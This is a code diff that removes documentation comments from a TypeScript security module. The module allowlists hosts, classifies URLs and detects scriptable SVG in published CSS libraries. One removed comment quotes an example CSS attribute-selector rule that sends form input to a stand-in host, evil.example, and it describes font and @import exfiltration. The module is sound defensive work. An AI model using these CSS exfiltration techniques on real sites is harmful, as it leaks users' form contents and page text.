@@ -1,21 +1,3 @@
-/**
- * Hosts an absolute URL in a published library may point at.
- *
- * This is a security control, not hygiene. A published library is injected into
- * the customer's own document with full CSS power:
- *
- *   input[value^="a"] { background: url(https://evil.example/a) }
- *
- * leaks form field contents one character at a time; `@font-face` with
- * `unicode-range` leaks page text; and `@import` pulls an unbounded second-stage
- * payload that bypasses every other check at load time. This allowlist is the
- * only boundary between a hostile library and cross-site exfiltration from the
- * customer's site.
- *
- * Google Fonts is acceptable specifically because it is a content-fixed
- * generator — it returns nothing but `@font-face` blocks — which is a different
- * risk class from an arbitrary origin.
- */
 export const DEFAULT_ALLOWED_HOSTS: readonly string[] = [
   "fonts.googleapis.com",
   "fonts.gstatic.com",
@@ -23,7 +5,6 @@ export const DEFAULT_ALLOWED_HOSTS: readonly string[] = [
   "cdn.jsdelivr.net",
 ];
 
-/** MIME types a `data:` URL in a published library may declare. */
 export const ALLOWED_DATA_URL_TYPES: readonly string[] = [
   "image/svg+xml",
   "image/png",
@@ -44,12 +25,6 @@ export type ClassifiedUrl =
 
 const SCHEME = /^([a-z][a-z0-9+.-]*):/i;
 
-/**
- * Classify a URL as written in the stylesheet. Deliberately does not resolve
- * against a base — a relative URL in a hosted library can only ever reach
- * another artifact under the same library prefix, so it is reported rather
- * than silently resolved.
- */
 export function classifyUrl(raw: string): ClassifiedUrl {
   const value = raw.trim();
 
@@ -97,10 +72,6 @@ function parseDataUrl(value: string): ClassifiedUrl | null {
   return { kind: "data", mime, base64, payload };
 }
 
-/**
- * Decode a data: URL payload for inspection. Returns null when the payload is
- * not decodable, which callers must treat as suspicious rather than benign.
- */
 export function decodeDataUrlPayload(payload: string, base64: boolean): string | null {
   try {
     if (base64) return atob(payload);
@@ -110,7 +81,6 @@ export function decodeDataUrlPayload(payload: string, base64: boolean): string |
   }
 }
 
-/** SVG that can execute script must never be embedded in a published artifact. */
 export function svgPayloadIsScriptable(decoded: string): boolean {
   return /<script[\s>]/i.test(decoded) || /\son\w+\s*=/i.test(decoded);
 }
